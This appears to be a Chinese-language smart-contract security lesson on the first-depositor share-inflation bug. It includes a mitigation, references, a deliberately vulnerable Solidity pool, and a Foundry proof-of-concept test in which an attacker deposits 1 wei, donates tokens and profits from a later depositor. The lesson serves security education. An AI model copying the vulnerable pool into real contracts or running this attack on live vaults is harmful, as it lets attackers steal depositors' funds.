# 首次存款错误

**名称：** 首次存款错误

**描述：** 第一个矿池存款人可能会抢先交易，并被盗取部分存款。在这种情况下，我们可以控制变量“_supplied”。 通过存入少量贷款代币来获得矿池代币，我们可以抢先其他储户的交易，并通过大量“捐赠”抬高矿池代币的价格。 因此，攻击者可以提取比他们最初拥有的更多的贷款代币。

出现这个计算问题是因为，在 Solidity 中，如果用户的池代币值小于 1，它实际上会向下舍入到 0。

**解决办法：**

考虑在第一次存款期间铸造最少量的矿池代币并将其发送到零地址，这会增加攻击成本。 Uniswap V2 通过将前 1000 个 LP 代币发送到零地址解决了这个问题。 在这种情况下也可以做同样的事情，即当totalSupply() == 0时，将第一个最小流动性LP代币发送到零地址以实现份额稀释。

**参考：**

https://defihacklabs.substack.com/p/solidity-security-lesson-2-first

https://github.com/sherlock-audit/2023-02-surge-judging/issues/1

https://github.com/transmissions11/solmate/issues/178

**合约样例:**

```jsx
contract MyToken is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract SimplePool {
    IERC20 public loanToken;
    uint public totalShares;

    mapping(address => uint) public balanceOf;

    constructor(address _loanToken) {
        loanToken = IERC20(_loanToken);
    }

    function deposit(uint amount) external {
        require(amount > 0, "Amount must be greater than zero");

        uint _shares;
        if (totalShares == 0) {
            _shares = amount;
        } else {
            _shares = tokenToShares(
                amount,
                loanToken.balanceOf(address(this)),
                totalShares,
                false
            );
        }

        require(
            loanToken.transferFrom(msg.sender, address(this), amount),
            "TransferFrom failed"
        );
        balanceOf[msg.sender] += _shares;
        totalShares += _shares;
    }

    function tokenToShares(
        uint _tokenAmount,
        uint _supplied,
        uint _sharesTotalSupply,
        bool roundUpCheck
    ) internal pure returns (uint) {
        if (_supplied == 0) return _tokenAmount;
        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;
        if (
            roundUpCheck &&
            shares * _supplied < _tokenAmount * _sharesTotalSupply
        ) shares++;
        return shares;
    }

    function withdraw(uint shares) external {
        require(shares > 0, "Shares must be greater than zero");
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");

        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /
            totalShares;

        balanceOf[msg.sender] -= shares;
        totalShares -= shares;

        require(loanToken.transfer(msg.sender, tokenAmount), "Transfer failed");
    }
}
```

***\*测试方法:\****

仿真测试 --contracts src/test/**first-deposit.sol**-vvvv

```jsx
// Function to test the first deposit process
    function testFirstDeposit() public {
        // Alice's address is set as the first address in the virtual machine
        address alice = vm.addr(1);
        
        // Bob's address is set as the second address in the virtual machine
        address bob = vm.addr(2);
        
        // Transfers 1 Ether plus 1 wei to Alice's account from the MyTokenContract
        MyTokenContract.transfer(alice, 1 ether + 1);
        
        // Transfers 2 Ether to Bob's account from the MyTokenContract
        MyTokenContract.transfer(bob, 2 ether);

        // Initiates a "prank" on Alice's account in the virtual machine
        vm.startPrank(alice);
        
        // Alice approves the SimplePoolContract to spend 1 wei of her tokens
        MyTokenContract.approve(address(SimplePoolContract), 1);
        
        // Alice deposits 1 wei into the SimplePoolContract, receiving 1 pool token in return
        SimplePoolContract.deposit(1);

        // Alice transfers 1 Ether to the SimplePoolContract, which inflates the price of the pool tokens
        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);

        // Stops the prank on Alice's account
        vm.stopPrank();
        
        // Initiates a prank on Bob's account
        vm.startPrank(bob);
        
        // Bob approves the SimplePoolContract to spend 2 Ether of his tokens
        MyTokenContract.approve(address(SimplePoolContract), 2 ether);
        
        // Bob deposits 2 Ether into the SimplePoolContract, but due to the inflated price, he only receives 1 pool token
        SimplePoolContract.deposit(2 ether);
        
        // Stops the prank on Bob's account
        vm.stopPrank();
        
        // Initiates a prank on Alice's account
        vm.startPrank(alice);

        // Gets the balance of the SimplePoolContract in MyTokenContract
        MyTokenContract.balanceOf(address(SimplePoolContract));

        // Alice withdraws 1 pool token and gets 1.5 Ether, thus making a profit
        SimplePoolContract.withdraw(1);
        
        // Asserts that Alice's balance should now be 1.5 Ether. If it's not, it throws an error
        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);
        
        // Logs Alice's balance in the console
        console.log("Alice balance", MyTokenContract.balanceOf(alice));
    }
```

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf5edaeb-708c-433d-b87f-9fd9a16b7633%2FUntitled.png?table=block&id=9f907b3b-45de-448e-ae5b-a3c771d9743f&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)